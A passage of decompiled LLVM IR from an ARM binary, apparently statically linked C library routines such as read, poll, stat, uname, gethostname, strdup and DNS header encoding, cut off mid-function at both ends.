  uselistorder i32 ()* @free, { 21, 20, 19, 18, 17, 16, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0, 22, 30, 29, 28, 15, 14, 13, 12, 4, 11, 27, 26, 25, 24, 23 }
  uselistorder i32* @global_var_23120.283, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_16c54, { 7, 4, 5, 6, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_16c50, { 1, 0 }
  uselistorder label %dec_label_pc_16c3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16be8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b94, { 1, 0 }
  uselistorder label %dec_label_pc_16a14, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_16c7c = load i32, i32* @r1, align 4
  %v2_16c7c = icmp eq i32 %v0_16c7c, 0
  %v3_16c80 = load i32, i32* @r4, align 4
  store i32 %v3_16c80, i32* %stack_var_-8, align 4
  %v0_16c84 = load i32, i32* @r0, align 4
  store i32 %v0_16c84, i32* %r4.global-to-local, align 4
  br i1 %v2_16c7c, label %dec_label_pc_16ca8, label %dec_label_pc_16c8c

dec_label_pc_16c8c:                               ; preds = %entry
  %v1_16c94 = add i32 %v0_16c84, 260
  %v4_16c98 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_16c94)
  %v2_16c9c = icmp eq i32 %v4_16c98, 0
  br i1 %v2_16c9c, label %dec_label_pc_16cac, label %dec_label_pc_16ca8

dec_label_pc_16ca8:                               ; preds = %dec_label_pc_16c8c, %entry
  br label %dec_label_pc_16cac

dec_label_pc_16cac:                               ; preds = %dec_label_pc_16c8c, %dec_label_pc_16ca8
  %storemerge = phi i32 [ 0, %dec_label_pc_16ca8 ], [ 1, %dec_label_pc_16c8c ]
  %v1_16cb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_16cb0 = add i32 %v1_16cb0, 256
  %v3_16cb0 = inttoptr i32 %v2_16cb0 to i32*
  store i32 %storemerge, i32* %v3_16cb0, align 4
  %v2_16cb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16cb4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* null, { 6, 2, 0, 3, 4, 5, 1, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_16cac, { 1, 0 }
}

define i32 @function_16cbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_16cbc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_16cc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16cc0, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_16cbc
  %v2_16cc0 = load i32, i32* @r8, align 4
  %v3_16cc0 = load i32, i32* @ip, align 4
  %v8_16cc0 = lshr i32 %v2_16cc0, %v3_16cc0
  %v9_16cc0 = and i32 %v8_16cc0, %arg1
  call void @__pseudo_branch(i32 %v9_16cc0)
  %v10_16cc0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_16cbc, %bb
  %v10_16cc0 = phi i32 [ %arg1, %dec_label_pc_16cbc ], [ %v10_16cc0.pre, %bb ]
  ret i32 %v10_16cc0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_16cd4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16cd4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16cd4 = load i32, i32* @r0, align 4
  ret i32 %v2_16cd4

bb1:                                              ; preds = %entry
  %v0_16cd8 = call i32 @__syscall_error()
  ret i32 %v0_16cd8
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16ce4 = load i32, i32* @global_var_26924.451, align 4
  %v2_16ce8 = icmp eq i32 %v3_16ce4, 0
  br i1 %v2_16ce8, label %dec_label_pc_16cf0, label %entry.dec_label_pc_16d0c_crit_edge

entry.dec_label_pc_16d0c_crit_edge:               ; preds = %entry
  %v3_16d0c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_16d0c

dec_label_pc_16cf0:                               ; preds = %entry
  %v0_16cf0 = load i32, i32* @r7, align 4
  store i32 %v0_16cf0, i32* @ip, align 4
  %v0_16d00 = load i32, i32* @r0, align 4
  %v2_16d00 = icmp ugt i32 %v0_16d00, -4097
  br i1 %v2_16d00, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_16d0c, %dec_label_pc_16cf0
  %merge = phi i32 [ %v0_16d00, %dec_label_pc_16cf0 ], [ %v0_16d30, %dec_label_pc_16d0c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_16cf0
  %v0_16d08 = call i32 @__syscall_error()
  br label %dec_label_pc_16d0c

dec_label_pc_16d0c:                               ; preds = %entry.dec_label_pc_16d0c_crit_edge, %bb8
  %v3_16d0c = phi i32 [ %v3_16d0c.pre, %entry.dec_label_pc_16d0c_crit_edge ], [ %v0_16d08, %bb8 ]
  store i32 %v3_16d0c, i32* %stack_var_-24, align 4
  %v6_16d0c = load i32, i32* @r1, align 4
  %v15_16d0c = load i32, i32* @r7, align 4
  store i32 %v15_16d0c, i32* %stack_var_-8, align 4
  %v18_16d0c = load i32, i32* @lr, align 4
  %v0_16d10 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_16d10, i32* @ip, align 4
  %v2_16d18 = load i32, i32* %stack_var_-24, align 4
  store i32 %v6_16d0c, i32* @r1, align 4
  store i32 %v2_16d18, i32* @r7, align 4
  %v1_16d2c = call i32 @__libc_disable_asynccancel(i32 %v0_16d10)
  %v0_16d30 = load i32, i32* @r7, align 4
  store i32 %v0_16d30, i32* @r0, align 4
  %v2_16d34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16d34, i32* @r7, align 4
  store i32 %v18_16d0c, i32* @lr, align 4
  %v2_16d38 = icmp ugt i32 %v0_16d30, -4097
  br i1 %v2_16d38, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_16d0c
  %v0_16d40 = call i32 @__syscall_error()
  ret i32 %v0_16d40

; uselistorder directives
  uselistorder i32 %v0_16d30, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 7, 6, 11, 3, 2, 10, 1, 0, 9, 5, 4, 8 }
  uselistorder label %dec_label_pc_16d0c, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_16d5c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_16d68 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16d68, i32* %r5.global-to-local, align 4
  %v1_16d6c = call i32 @uname(i32 %v2_16d5c)
  %v7_16d70 = icmp eq i32 %v1_16d6c, -1
  br i1 %v7_16d70, label %bb, label %dec_label_pc_16d7c

bb:                                               ; preds = %entry
  store i32 %v1_16d6c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16dc0

dec_label_pc_16d7c:                               ; preds = %entry
  %v2_16d7c = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_16d84 = call i32 @strlen(i8* %tmp10)
  %v1_16d88 = add i32 %v3_16d84, 1
  %v1_16d8c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_16d88, %v1_16d8c
  br i1 %tmp, label %dec_label_pc_16d94, label %dec_label_pc_16db0

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d7c
  %v0_16d98 = call i32 @__aeabi_read_tp()
  %v3_16d9c = load i16, i16* @global_var_23164.175, align 2
  %v4_16d9c = sext i16 %v3_16d9c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16da8 = add i32 %v4_16d9c, %v0_16d98
  %v4_16da8 = inttoptr i32 %v3_16da8 to i32*
  store i32 22, i32* %v4_16da8, align 4
  %v0_16dc0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16dc0

dec_label_pc_16db0:                               ; preds = %dec_label_pc_16d7c
  store i32 %v2_16d7c, i32* @r1, align 4
  %v0_16db4 = load i32, i32* %r6.global-to-local, align 4
  %v2_16db8 = inttoptr i32 %v0_16db4 to i8*
  %v3_16db8 = call i32 @strcpy(i8* %v2_16db8, i32 %v2_16d7c)
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16dc0

dec_label_pc_16dc0:                               ; preds = %bb, %dec_label_pc_16d94, %dec_label_pc_16db0
  %v0_16dc0 = phi i32 [ %v1_16d6c, %bb ], [ %v0_16dc0.pre, %dec_label_pc_16d94 ], [ 0, %dec_label_pc_16db0 ]
  ret i32 %v0_16dc0

; uselistorder directives
  uselistorder i32 %v2_16d7c, { 1, 0 }
  uselistorder i32 %v1_16d6c, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 (i8*, i32)* @strcpy, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 22, { 1, 11, 2, 14, 3, 13, 4, 5, 6, 7, 10, 15, 8, 0, 12, 9 }
  uselistorder label %dec_label_pc_16dc0, { 2, 1, 0 }
}

define i32 @__syscall_poll() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16dd4 = load i32, i32* @r7, align 4
  store i32 %v3_16dd4, i32* %stack_var_-8, align 4
  %v0_16de0 = load i32, i32* @r0, align 4
  store i32 %v0_16de0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16de0, -4095
  br i1 %tmp, label %dec_label_pc_16e08, label %dec_label_pc_16df0

dec_label_pc_16df0:                               ; preds = %entry
  %v0_16df4 = call i32 @__aeabi_read_tp()
  %v3_16df8 = load i16, i16* @global_var_23164.175, align 2
  %v4_16df8 = sext i16 %v3_16df8 to i32
  %v0_16dfc = load i32, i32* %r2.global-to-local, align 4
  %v1_16dfc = sub i32 0, %v0_16dfc
  store i32 %v1_16dfc, i32* %r2.global-to-local, align 4
  %v3_16e00 = add i32 %v4_16df8, %v0_16df4
  %v4_16e00 = inttoptr i32 %v3_16e00 to i32*
  store i32 %v1_16dfc, i32* %v4_16e00, align 4
  %v2_16e08.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16e08

dec_label_pc_16e08:                               ; preds = %entry, %dec_label_pc_16df0
  %v1_16e0c = phi i32 [ %v0_16de0, %entry ], [ -1, %dec_label_pc_16df0 ]
  %v2_16e08 = phi i32 [ %v3_16dd4, %entry ], [ %v2_16e08.pre, %dec_label_pc_16df0 ]
  store i32 %v2_16e08, i32* @r7, align 4
  ret i32 %v1_16e0c

; uselistorder directives
  uselistorder i32 %v0_16de0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16e08, { 1, 0 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16e18 = load i32, i32* @r4, align 4
  store i32 %v3_16e18, i32* %stack_var_-20, align 4
  %v6_16e18 = load i32, i32* @r5, align 4
  %v9_16e18 = load i32, i32* @r6, align 4
  %v12_16e18 = load i32, i32* @r7, align 4
  %v4_16e24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_16e28 = icmp eq i32 %v4_16e24, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_16e28, label %dec_label_pc_16e40, label %entry.dec_label_pc_16e4c_crit_edge

entry.dec_label_pc_16e4c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_16e4c

dec_label_pc_16e40:                               ; preds = %entry
  store i32 %v3_16e18, i32* @r4, align 4
  store i32 %v9_16e18, i32* @r6, align 4
  store i32 %v12_16e18, i32* @r7, align 4
  %v0_16e48 = call i32 @__syscall_poll()
  br label %dec_label_pc_16e4c

dec_label_pc_16e4c:                               ; preds = %entry.dec_label_pc_16e4c_crit_edge, %dec_label_pc_16e40
  %v0_16e4c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_16e4c, i32* @r5, align 4
  %v0_16e5c = load i32, i32* @r4, align 4
  store i32 %v0_16e5c, i32* @r0, align 4
  %v0_16e60 = call i32 @__syscall_poll()
  store i32 %v0_16e60, i32* @r4, align 4
  %v0_16e68 = load i32, i32* @r5, align 4
  %v1_16e6c = call i32 @__libc_disable_asynccancel(i32 %v0_16e68)
  %v0_16e70 = load i32, i32* @r4, align 4
  %v2_16e78 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16e78, i32* @r4, align 4
  store i32 %v6_16e18, i32* @r5, align 4
  store i32 %v9_16e18, i32* @r6, align 4
  store i32 %v12_16e18, i32* @r7, align 4
  ret i32 %v0_16e70

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 11, 10, 13, 1, 2, 0, 5, 12, 7, 8, 6, 4, 14, 3, 9 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 11, 10, 13, 1, 2, 0, 5, 12, 7, 8, 6, 4, 14, 3, 9 }
  uselistorder label %dec_label_pc_16e4c, { 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 195, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16ec8, label %dec_label_pc_16eac

dec_label_pc_16eac:                               ; preds = %entry
  %v0_16eb0 = call i32 @__aeabi_read_tp()
  %v3_16eb4 = load i16, i16* @global_var_23164.175, align 2
  %v4_16eb4 = sext i16 %v3_16eb4 to i32
  %v0_16eb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16eb8 = sub i32 0, %v0_16eb8
  store i32 %v1_16eb8, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_16ec0 = add i32 %v4_16eb4, %v0_16eb0
  %v4_16ec0 = inttoptr i32 %v3_16ec0 to i32*
  store i32 %v1_16eb8, i32* %v4_16ec0, align 4
  br label %dec_label_pc_16ed8

dec_label_pc_16ec8:                               ; preds = %entry
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v2_16ec8 = icmp eq i32 %arg1, 0
  br i1 %v2_16ec8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16ec8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16ec8, %bb
  call void @__pseudo_cond_branch(i1 %v2_16ec8, i32 ptrtoint (i32* @global_var_14ca8.601 to i32))
  br label %dec_label_pc_16ed8

dec_label_pc_16ed8:                               ; preds = %dec_label_pc_16eac, %.thread
  %v0_16ed8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16ed8

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_16ed8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16eec = load i32, i32* @r7, align 4
  store i32 %v3_16eec, i32* %stack_var_-8, align 4
  %v0_16ef8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16ef8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16ef8, -4095
  br i1 %tmp, label %dec_label_pc_16f20, label %dec_label_pc_16f08

dec_label_pc_16f08:                               ; preds = %entry
  %v0_16f0c = call i32 @__aeabi_read_tp()
  %v3_16f10 = load i16, i16* @global_var_23164.175, align 2
  %v4_16f10 = sext i16 %v3_16f10 to i32
  %v0_16f14 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f14 = sub i32 0, %v0_16f14
  store i32 %v1_16f14, i32* %r2.global-to-local, align 4
  %v3_16f18 = add i32 %v4_16f10, %v0_16f0c
  %v4_16f18 = inttoptr i32 %v3_16f18 to i32*
  store i32 %v1_16f14, i32* %v4_16f18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16f20.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16f20

dec_label_pc_16f20:                               ; preds = %entry, %dec_label_pc_16f08
  %v1_16f24 = phi i32 [ %v0_16ef8, %entry ], [ -1, %dec_label_pc_16f08 ]
  %v2_16f20 = phi i32 [ %v3_16eec, %entry ], [ %v2_16f20.pre, %dec_label_pc_16f08 ]
  store i32 %v2_16f20, i32* @r7, align 4
  ret i32 %v1_16f24

; uselistorder directives
  uselistorder i32 %v0_16ef8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16f20, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_16f74, label %dec_label_pc_16f58

dec_label_pc_16f58:                               ; preds = %entry
  %v0_16f5c = call i32 @__aeabi_read_tp()
  %v3_16f60 = load i16, i16* @global_var_23164.175, align 2
  %v4_16f60 = sext i16 %v3_16f60 to i32
  %v0_16f64 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f64 = sub i32 0, %v0_16f64
  store i32 %v1_16f64, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16f6c = add i32 %v4_16f60, %v0_16f5c
  %v4_16f6c = inttoptr i32 %v3_16f6c to i32*
  store i32 %v1_16f64, i32* %v4_16f6c, align 4
  %v0_16f7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16f7c

dec_label_pc_16f74:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_16f74 = icmp eq i32 %arg1, 0
  br i1 %v2_16f74, label %dec_label_pc_16f88, label %dec_label_pc_16f7c

dec_label_pc_16f7c:                               ; preds = %dec_label_pc_16f74, %dec_label_pc_16f58
  %v0_16f7c = phi i32 [ %arg1, %dec_label_pc_16f74 ], [ %v0_16f7c.pre, %dec_label_pc_16f58 ]
  %v3_16f80 = ashr i32 %v0_16f7c, 31
  br label %dec_label_pc_16f8c

dec_label_pc_16f88:                               ; preds = %dec_label_pc_16f74
  br label %dec_label_pc_16f8c

dec_label_pc_16f8c:                               ; preds = %dec_label_pc_16f7c, %dec_label_pc_16f88
  %v1_16f94 = phi i32 [ %v0_16f7c, %dec_label_pc_16f7c ], [ %tmp8, %dec_label_pc_16f88 ]
  %storemerge = phi i32 [ %v3_16f80, %dec_label_pc_16f7c ], [ %tmp, %dec_label_pc_16f88 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_16f94

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_16f8c, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_16fa0 = load i32, i32* @r0, align 4
  %v1_16fa0 = load i32, i32* @r1, align 4
  %v2_16fa0 = inttoptr i32 %v0_16fa0 to i8*
  %v3_16fa0 = call i32 @_memcpy(i8* %v2_16fa0, i32 %v1_16fa0)
  ret i32 %v3_16fa0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_16fb0 = load i32, i32* @r4, align 4
  store i32 %v3_16fb0, i32* %stack_var_-16, align 4
  %v9_16fb0 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_16fb8 = call i32 @strlen(i8* %arg1)
  %v1_16fbc = add i32 %v3_16fb8, 1
  store i32 %v1_16fbc, i32* @r4, align 4
  %v1_16fc4 = call i32 @malloc(i32 %v1_16fbc)
  store i32 %v1_16fc4, i32* %r5.global-to-local, align 4
  %v2_16fc8 = icmp eq i32 %v1_16fc4, 0
  br i1 %v2_16fc8, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_16fd4 = xor i1 %v2_16fc8, true
  call void @__pseudo_cond_branch(i1 %v1_16fd4, i32 ptrtoint (i32* @global_var_d8b0.471 to i32))
  %v0_16fd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16fdc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16fdc, i32* @r4, align 4
  store i32 %v9_16fb0, i32* @r6, align 4
  ret i32 %v0_16fd8

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 10, 9, 8, 2, 0, 11, 12, 19, 7, 6, 5, 1, 4, 3, 18, 17, 16, 15, 14, 13 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_16fe8 = load i32, i32* @lr, align 4
  store i32 %v0_16fe8, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* @ip, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_16ff4 = icmp sgt i32 %arg3, 11
  br i1 %v7_16ff4, label %dec_label_pc_16ffc, label %dec_label_pc_170c8

dec_label_pc_16ffc:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_16ffc = add i32 %tmp, 1
  %v2_16ffc = inttoptr i32 %v1_16ffc to i8*
  %v3_16ffc = load i8, i8* %v2_16ffc, align 1
  store i8 %v3_16ffc, i8* %tmp16, align 1
  %v0_17004 = load i32, i32* @ip, align 4
  %v1_17004 = inttoptr i32 %v0_17004 to i32*
  %v2_17004 = load i32, i32* %v1_17004, align 4
  %v1_17008 = trunc i32 %v2_17004 to i8
  %v4_17008 = add i32 %arg2, 1
  %v5_17008 = inttoptr i32 %v4_17008 to i8*
  store i8 %v1_17008, i8* %v5_17008, align 1
  %v0_1700c = load i32, i32* @ip, align 4
  %v1_1700c = add i32 %v0_1700c, 8
  %v2_1700c = inttoptr i32 %v1_1700c to i32*
  %v3_1700c = load i32, i32* %v2_1700c, align 4
  %v1_17010 = add i32 %v0_1700c, 20
  %v2_17010 = inttoptr i32 %v1_17010 to i32*
  %v3_17010 = load i32, i32* %v2_17010, align 4
  %v1_17014 = add i32 %v0_1700c, 4
  %v2_17014 = inttoptr i32 %v1_17014 to i32*
  %v3_17014 = load i32, i32* %v2_17014, align 4
  %v1_17018 = add i32 %v0_1700c, 12
  %v2_17018 = inttoptr i32 %v1_17018 to i32*
  %v3_17018 = load i32, i32* %v2_17018, align 4
  %v2_1701c = icmp eq i32 %v3_17010, 0
  br i1 %v2_1701c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_16ffc
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_16ffc, %bb
  %v0_1702c = phi i32 [ 0, %dec_label_pc_16ffc ], [ 1, %bb ]
  %v1_17024 = urem i32 %v3_1700c, 16
  %v2_17028 = icmp eq i32 %v3_17014, 0
  %v4_1702c = mul nuw nsw i32 %v1_17024, 8
  %v5_1702c = or i32 %v0_1702c, %v4_1702c
  %v1_17030 = add i32 %v0_1700c, 16
  %v2_17030 = inttoptr i32 %v1_17030 to i32*
  %v3_17030 = load i32, i32* %v2_17030, align 4
  %. = select i1 %v2_17028, i32 0, i32 128
  %v2_1703c = icmp eq i32 %v3_17018, 0
  %storemerge11 = select i1 %v2_1703c, i32 0, i32 4
  %v2_17048 = or i32 %v5_1702c, %.
  %v2_1704c = icmp eq i32 %v3_17030, 0
  %.26 = select i1 %v2_1704c, i32 0, i32 2
  %v2_17058 = or i32 %v2_17048, %storemerge11
  %v2_1705c = or i32 %v2_17058, %.26
  %v1_17060 = trunc i32 %v2_1705c to i8
  %v2_17060 = load i32, i32* %lr.global-to-local, align 4
  %v3_17060 = add i32 %v2_17060, 2
  %v4_17060 = inttoptr i32 %v3_17060 to i8*
  store i8 %v1_17060, i8* %v4_17060, align 1
  %v0_17064 = load i32, i32* @ip, align 4
  %v1_17064 = add i32 %v0_17064, 24
  %v1_17068 = inttoptr i32 %v1_17064 to i32*
  %v2_17068 = load i32, i32* %v1_17068, align 4
  %v3_17068 = add i32 %v0_17064, 28
  %v4_17068 = inttoptr i32 %v3_17068 to i32*
  %v5_17068 = load i32, i32* %v4_17068, align 4
  %v2_1706c = icmp eq i32 %v2_17068, 0
  %v1_17070 = urem i32 %v5_17068, 16
  %v0_1707c = select i1 %v2_1706c, i32 0, i32 128
  %v2_1707c = or i32 %v1_17070, %v0_1707c
  %v1_17080 = trunc i32 %v2_1707c to i8
  %v2_17080 = load i32, i32* %lr.global-to-local, align 4
  %v3_17080 = add i32 %v2_17080, 3
  %v4_17080 = inttoptr i32 %v3_17080 to i8*
  store i8 %v1_17080, i8* %v4_17080, align 1
  %v0_17084 = load i32, i32* @ip, align 4
  %v1_17084 = add i32 %v0_17084, 33
  %v2_17084 = inttoptr i32 %v1_17084 to i8*
  %v3_17084 = load i8, i8* %v2_17084, align 1
  %v2_17088 = load i32, i32* %lr.global-to-local, align 4
  %v3_17088 = add i32 %v2_17088, 4
  %v4_17088 = inttoptr i32 %v3_17088 to i8*
  store i8 %v3_17084, i8* %v4_17088, align 1
  %v0_1708c = load i32, i32* @ip, align 4
  %v1_1708c = add i32 %v0_1708c, 32
  %v2_1708c = inttoptr i32 %v1_1708c to i32*
  %v3_1708c = load i32, i32* %v2_1708c, align 4
  %v1_17090 = trunc i32 %v3_1708c to i8
  %v2_17090 = load i32, i32* %lr.global-to-local, align 4
  %v3_17090 = add i32 %v2_17090, 5
  %v4_17090 = inttoptr i32 %v3_17090 to i8*
  store i8 %v1_17090, i8* %v4_17090, align 1
  %v0_17094 = load i32, i32* @ip, align 4
  %v1_17094 = add i32 %v0_17094, 37
  %v2_17094 = inttoptr i32 %v1_17094 to i8*
  %v3_17094 = load i8, i8* %v2_17094, align 1
  %v2_17098 = load i32, i32* %lr.global-to-local, align 4
  %v3_17098 = add i32 %v2_17098, 6
  %v4_17098 = inttoptr i32 %v3_17098 to i8*
  store i8 %v3_17094, i8* %v4_17098, align 1
  %v0_1709c = load i32, i32* @ip, align 4
  %v1_1709c = add i32 %v0_1709c, 36
  %v2_1709c = inttoptr i32 %v1_1709c to i32*
  %v3_1709c = load i32, i32* %v2_1709c, align 4
  %v1_170a0 = trunc i32 %v3_1709c to i8
  %v2_170a0 = load i32, i32* %lr.global-to-local, align 4
  %v3_170a0 = add i32 %v2_170a0, 7
  %v4_170a0 = inttoptr i32 %v3_170a0 to i8*
  store i8 %v1_170a0, i8* %v4_170a0, align 1
  %v0_170a4 = load i32, i32* @ip, align 4
  %v1_170a4 = add i32 %v0_170a4, 41
  %v2_170a4 = inttoptr i32 %v1_170a4 to i8*
  %v3_170a4 = load i8, i8* %v2_170a4, align 1
  %v2_170a8 = load i32, i32* %lr.global-to-local, align 4
  %v3_170a8 = add i32 %v2_170a8, 8
  %v4_170a8 = inttoptr i32 %v3_170a8 to i8*
  store i8 %v3_170a4, i8* %v4_170a8, align 1
  %v0_170ac = load i32, i32* @ip, align 4
  %v1_170ac = add i32 %v0_170ac, 40
  %v2_170ac = inttoptr i32 %v1_170ac to i32*
  %v3_170ac = load i32, i32* %v2_170ac, align 4
  %v1_170b0 = trunc i32 %v3_170ac to i8
  %v2_170b0 = load i32, i32* %lr.global-to-local, align 4
  %v3_170b0 = add i32 %v2_170b0, 9
  %v4_170b0 = inttoptr i32 %v3_170b0 to i8*
  store i8 %v1_170b0, i8* %v4_170b0, align 1
  %v0_170b4 = load i32, i32* @ip, align 4
